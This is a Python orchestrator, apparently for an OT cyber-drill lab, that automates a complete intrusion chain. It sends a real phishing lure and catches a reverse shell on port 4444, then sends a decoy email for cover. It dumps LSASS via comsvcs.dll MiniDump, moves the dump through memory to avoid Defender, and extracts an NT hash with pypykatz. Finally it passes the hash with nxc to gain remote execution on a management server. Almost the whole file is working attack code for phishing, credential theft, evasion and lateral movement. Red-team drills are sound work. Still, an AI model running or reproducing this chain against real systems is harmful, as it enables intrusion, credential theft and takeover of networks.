"""
OT Cyber Drill — GP-0 → GP-2 orchestrator.
Run from MC01:  python -I drill_run.py

Controls Kali (10.5.20.50) over SSH and RAC (10.5.20.10) over WinRM.
Chains the three stages with interactive prompts between each.

Stage 0 — Phishing foothold
    Deploy artefacts to Kali → start HTTP :8080 + shell handler :4444 →
    send real lure email → wait for shell → confirm identity → send decoy reply.

Stage 1 — Credential extraction  (choose one)
    A  Interactive shell   Restart handler, operator clicks again, gets a live
                           PS terminal on RAC via the SSH bridge on Kali.
    B  Silent dump         WinRM-dump LSASS on RAC, stream bytes into memory,
                           write to Kali via SFTP, extract NT hash with pypykatz.

Stage 2 — Pass-the-hash → NMS
    Run nxc from Kali against SINEC NMS (192.168.30.11) with the recovered hash.
"""
import sys, asyncio, hashlib, base64, socket, threading, time, textwrap, io
from pathlib import Path
sys.path.insert(0, "backend")

try:
    import asyncssh
    from pypsrp.client import Client as WinRMClient
except ImportError as e:
    sys.exit(f"Missing dependency: {e}\nActivate the backend venv first.")

# ── constants ──────────────────────────────────────────────────────────────────
KALI      = "10.5.20.50"
KALI_PIN  = "SHA256:usPlqQ8/75/E6iXqsKrwmAzk7/69fUsC7X2+eecHoAA"
RAC       = "10.5.20.10"
RAC_USER  = "NP\\Administrator"
RAC_PASS  = ""  # redacted for VCS — set to the RAC domain-admin password before running
NMS       = "192.168.30.11"
NMS_HASH  = None   # filled in by Stage 1
ART       = Path("Lab-Modules/OT-Cyber-Drill/cyberdrill-artefact/gp0-phish")

KALI_FILES = {
    str(ART / "Mailbox_Security_Update.hta"): "/home/kali/drill/web/Mailbox_Security_Update.hta",
    str(ART / "revshell.ps1"):                "/home/kali/drill/web/s.ps1",
    str(ART / "phish_email.py"):              "/home/kali/drill/phish_email.py",
    str(ART / "thankyou_email.py"):           "/home/kali/drill/thankyou_email.py",
}

# ── helpers ────────────────────────────────────────────────────────────────────
def banner(title):
    w = 62
    print(f"\n{'═'*w}")
    print(f"  {title}")
    print(f"{'═'*w}")

def ok(msg):   print(f"  [✓] {msg}")
def info(msg): print(f"  [·] {msg}")
def warn(msg): print(f"  [!] {msg}")
def prompt(msg):
    print(f"\n  ► {msg}")
    input("      Press ENTER to continue... ")

def verify_kali_key(conn):
    k = conn.get_server_host_key()
    got = "SHA256:" + base64.b64encode(
        hashlib.sha256(k.public_data).digest()).decode().rstrip("=")
    assert got == KALI_PIN, f"Kali key mismatch: {got}"

async def krun(conn, cmd, timeout=15):
    return await asyncio.wait_for(conn.run(cmd, check=False), timeout=timeout)


# ── Stage 0 ────────────────────────────────────────────────────────────────────
def _shell_server(result_box: list):
    """Blocking TCP server on :4444 — accepts one shell, runs recon commands."""
    CMDS = [
        ("whoami",                                          5),
        ('whoami /groups | findstr /i "Domain Admin"',      8),
    ]
    srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", 4444)); srv.listen(1); srv.settimeout(300)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        result_box.append(None); srv.close(); return

    def recv(s, timeout=8):
        s.settimeout(timeout); buf = b""
        try:
            while True:
                chunk = s.recv(65536)
                if not chunk: break
                buf += chunk
                if buf.rstrip().endswith(b">"): break
        except (socket.timeout, OSError): pass
        return buf.decode(errors="replace")

    lines = [f"shell_from:{addr[0]}:{addr[1]}"]
    recv(conn, 4)  # initial prompt
    for cmd, wait in CMDS:
        try: conn.send((cmd + "\n").encode())
        except OSError: break
        lines.append(f"CMD:{cmd}\n{recv(conn, wait)}")
    try: conn.send(b"exit\n")
    except OSError: pass
    try: conn.close()
    except OSError: pass
    srv.close()
    result_box.append("\n".join(lines))


async def stage0():
    banner("STAGE 0 — Phishing foothold")

    async with asyncssh.connect(KALI, username="kali", password="kali",
                                known_hosts=None, connect_timeout=15) as kali:
        verify_kali_key(kali)

        # Deploy artefacts
        info("Deploying artefacts to Kali ...")
        await krun(kali, "mkdir -p /home/kali/drill/web /home/kali/drill/loot; echo ok")
        async with kali.start_sftp_client() as sftp:
            for local, remote in KALI_FILES.items():
                await sftp.put(local, remote)
        ok("Artefacts deployed")

        # Kill stale, start HTTP server
        await krun(kali, "pkill -f 'python3 -m http.server 8080' 2>/dev/null; echo ok")
        await krun(kali,
            "nohup bash -c 'cd /home/kali/drill/web && python3 -m http.server 8080 "
            "> /home/kali/drill/loot/http.log 2>&1' > /dev/null 2>&1 & echo ok")
        ok("HTTP server :8080 started on Kali")

        # Start shell handler in background thread (listens on local :4444)
        result_box = []
        t = threading.Thread(target=_shell_server, args=(result_box,), daemon=True)
        t.start()
        ok("Shell handler :4444 ready (MC01 side)")

        # Send real lure
        r = await krun(kali,
            "python3 /home/kali/drill/phish_email.py --real; echo sent", timeout=20)
        if "sent" in r.stdout:
            ok(f"Lure email sent → RemoteIT@mail.np.local (shows as NP IT Administrator)")
        else:
            warn(f"Email send may have failed: {r.stdout.strip()[:100]}")

    # Operator prompt
    print()
    print("  ┌─────────────────────────────────────────────────────┐")
    print("  │  Log into RAC (10.5.20.10) as NP\\Administrator,    │")
    print("  │  open Thunderbird, find 'Action required: mailbox   │")
    print("  │  security update' and click Run Mailbox Security    │")
    print("  │  Update.                                             │")
    print("  └─────────────────────────────────────────────────────┘")
    input("\n      Press ENTER when you have clicked the button... ")

    info("Waiting for shell connection (up to 5 min) ...")
    t.join(timeout=300)

    if not result_box or result_box[0] is None:
        warn("No shell received within 5 minutes.")
        sys.exit(1)

    shell_info = result_box[0]
    for line in shell_info.splitlines():
        if line.startswith("shell_from:"):
            src = line.split("shell_from:")[1]
            ok(f"Shell received from {src}")
        elif "Domain Admin" in line:
            ok(f"Identity confirmed — Domain Admin")
            ok(f"  {line.strip()}")
        elif "np\\" in line.lower() and "CMD:" not in line:
            ok(f"  whoami: {line.strip()}")

    # Send thank-you decoy via Kali
    async with asyncssh.connect(KALI, username="kali", password="kali",
                                known_hosts=None, connect_timeout=15) as kali:
        verify_kali_key(kali)
        await krun(kali, "python3 /home/kali/drill/thankyou_email.py; echo ok", timeout=15)
    ok("Decoy 'update complete' email sent to victim — social cover maintained")

    ok("STAGE 0 COMPLETE")
    return True


# ── Stage 1A — interactive shell ───────────────────────────────────────────────
async def stage1_interactive():
    banner("STAGE 1A — Interactive shell on RAC")
    info("Restarting shell handler :4444 on Kali ...")

    BRIDGE = """
import socket, select, sys
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(('', 4444)); srv.listen(1)
print('[*] waiting for shell...', flush=True)
conn, addr = srv.accept()
print(f'[+] shell from {addr[0]}  (type "exit" to quit)', flush=True)
while True:
    r, _, _ = select.select([conn, sys.stdin], [], [], 0.2)
    if conn in r:
        d = conn.recv(4096)
        if not d: break
        sys.stdout.buffer.write(d); sys.stdout.buffer.flush()
    if sys.stdin in r:
        cmd = sys.stdin.readline()
        if not cmd: break
        conn.send(cmd.encode())
try: conn.close()
except: pass
"""
    async with asyncssh.connect(KALI, username="kali", password="kali",
                                known_hosts=None, connect_timeout=15) as kali:
        verify_kali_key(kali)
        await krun(kali, "pkill -9 nc 2>/dev/null; echo ok")
        async with kali.start_sftp_client() as sftp:
            async with sftp.open("/home/kali/drill/bridge.py", "w") as f:
                await f.write(BRIDGE)
        ok("Interactive bridge deployed to Kali:/home/kali/drill/bridge.py")

    print()
    print("  ┌──────────────────────────────────────────────────────────────┐")
    print("  │  In a NEW terminal, SSH into Kali and run the bridge:        │")
    print("  │                                                               │")
    print("  │    ssh kali@10.5.20.50                                        │")
    print("  │    python3 /home/kali/drill/bridge.py                        │")
    print("  │                                                               │")
    print("  │  Then click the email button AGAIN in Thunderbird.           │")
    print("  │  You will get an interactive PS prompt on RAC.               │")
    print("  │  Type 'exit' when done.                                       │")
    print("  └──────────────────────────────────────────────────────────────┘")
    input("\n      Press ENTER when you have finished the interactive session... ")
    ok("STAGE 1A COMPLETE")
    return None


# ── Stage 1B — silent dump + hash extract ─────────────────────────────────────
async def stage1_silent():
    banner("STAGE 1B — Silent LSASS dump + NT hash extraction")
    DMP_RAC  = r"C:\Windows\Temp\lb2.dmp"
    DMP_KALI = "/home/kali/drill/loot/lb2.dmp"

    # Dump on RAC via WinRM
    info("Dumping LSASS on RAC via WinRM ...")
    PS_DUMP = rf"""
$lp=(Get-Process lsass).Id; "PID:$lp"
Remove-Item '{DMP_RAC}' -Force -EA SilentlyContinue
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lp '{DMP_RAC}' full
Start-Sleep -Seconds 5
if(Test-Path '{DMP_RAC}'){{"size:"+((Get-Item '{DMP_RAC}').Length)}}else{{"MISSING"}}
"""
    with WinRMClient(RAC, username=RAC_USER, password=RAC_PASS,
                     auth="ntlm", ssl=False) as c:
        out, _, _ = c.execute_ps(PS_DUMP)
    print(f"       {out.strip()}")

    if "MISSING" in out or "size:0" in out:
        warn("Dump empty or missing — aborting."); sys.exit(1)

    # Pull bytes into memory (bypass MC01 Defender)
    info("Reading dump bytes from RAC into memory (no MC01 disk write) ...")
    PS_READ = rf"[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('{DMP_RAC}'))"
    with WinRMClient(RAC, username=RAC_USER, password=RAC_PASS,
                     auth="ntlm", ssl=False) as c:
        b64, _, _ = c.execute_ps(PS_READ)
    raw = base64.b64decode(b64.strip())
    ok(f"Dump in memory: {len(raw):,} bytes")

    # Stream to Kali SFTP
    info("Streaming dump → Kali SFTP ...")
    async with asyncssh.connect(KALI, username="kali", password="kali",
                                known_hosts=None, connect_timeout=15) as kali:
        verify_kali_key(kali)
        async with kali.start_sftp_client() as sftp:
            async with sftp.open(DMP_KALI, "wb") as rf:
                await rf.write(raw)
        ok(f"Dump on Kali: {DMP_KALI}")

        # pypykatz
        info("Running pypykatz ...")
        r = await asyncio.wait_for(
            kali.run(f"python3 -m pypykatz lsa minidump {DMP_KALI} 2>/dev/null",
                     check=False), timeout=120)
        lines = r.stdout.splitlines()

        nt_hash = None
        print()
        print("  ┌─── svc_backup ────────────────────────────────────┐")
        in_block = False
        for i, line in enumerate(lines):
            if "svc_backup" in line.lower():
                in_block = True
            if in_block:
                s = line.strip()
                print(f"  │  {s}")
                if s.startswith("NT:") and len(s) > 5:
                    nt_hash = s.split("NT:")[1].strip()
                if s.startswith("NT:") or (i > 0 and "Password:" in s and nt_hash):
                    break
        print("  └───────────────────────────────────────────────────┘")

        if nt_hash:
            ok(f"NT hash: {nt_hash}")
        else:
            warn("svc_backup hash not found in dump output.")

    ok("STAGE 1B COMPLETE")
    return nt_hash


# ── Stage 2 ────────────────────────────────────────────────────────────────────
async def stage2(nt_hash: str):
    banner("STAGE 2 — Pass-the-hash → NMS (192.168.30.11)")
    if not nt_hash:
        warn("No NT hash available — skipping PtH.")
        return

    async with asyncssh.connect(KALI, username="kali", password="kali",
                                known_hosts=None, connect_timeout=15) as kali:
        verify_kali_key(kali)

        info(f"nxc SMB against NMS with hash {nt_hash[:8]}... ...")
        r = await asyncio.wait_for(
            kali.run(f"nxc smb {NMS} -u svc_backup -H {nt_hash} -d np.local",
                     check=False), timeout=30)
        for line in r.stdout.strip().splitlines():
            tag = "[✓]" if "Pwn3d" in line else "[·]"
            print(f"  {tag} {line.strip()}")

        info("nxc WinRM ...")
        r = await asyncio.wait_for(
            kali.run(f"nxc winrm {NMS} -u svc_backup -H {nt_hash} -d np.local",
                     check=False), timeout=30)
        pwn3d = "Pwn3d" in r.stdout
        for line in r.stdout.strip().splitlines():
            tag = "[✓]" if "Pwn3d" in line else "[·]"
            print(f"  {tag} {line.strip()}")

        if pwn3d:
            r2 = await asyncio.wait_for(
                kali.run(f"nxc winrm {NMS} -u svc_backup -H {nt_hash} -d np.local -x whoami",
                         check=False), timeout=30)
            for line in r2.stdout.strip().splitlines():
                if "np\\" in line.lower():
                    ok(f"Remote execution confirmed: {line.strip()}")

    ok("STAGE 2 COMPLETE")
    w = 62
    print(f"\n{'═'*w}")
    print(f"  GP-0 → GP-2 CHAIN PROVEN END-TO-END")
    print(f"  Hash: {nt_hash}")
    print(f"{'═'*w}\n")


# ── main ───────────────────────────────────────────────────────────────────────
async def main():
    print("\n" + "╔" + "═"*60 + "╗")
    print("║  OT CYBER DRILL — GP-0 → GP-2 ORCHESTRATOR" + " "*16 + "║")
    print("║  Kali: 10.5.20.50  RAC: 10.5.20.10  NMS: 192.168.30.11  ║")
    print("╚" + "═"*60 + "╝")
    print()

    # Stage 0
    await stage0()

    # Stage 1
    print()
    print("  Stage 1 — choose an option:")
    print("    A  Interactive shell  (live PS terminal on RAC via Kali)")
    print("    B  Silent extraction  (dump LSASS, extract NT hash)")
    while True:
        choice = input("\n  > ").strip().upper()
        if choice in ("A", "B"):
            break
        print("  Enter A or B.")

    nt_hash = None
    if choice == "A":
        await stage1_interactive()
    else:
        nt_hash = await stage1_silent()

    # Stage 2
    if nt_hash:
        print()
        yn = input("  Run Stage 2 (PtH → NMS) now? [Y/n] ").strip().upper()
        if yn != "N":
            await stage2(nt_hash)
    else:
        print("  (Stage 2 needs a hash from Stage 1B — skipped.)")


if __name__ == "__main__":
    asyncio.run(main())
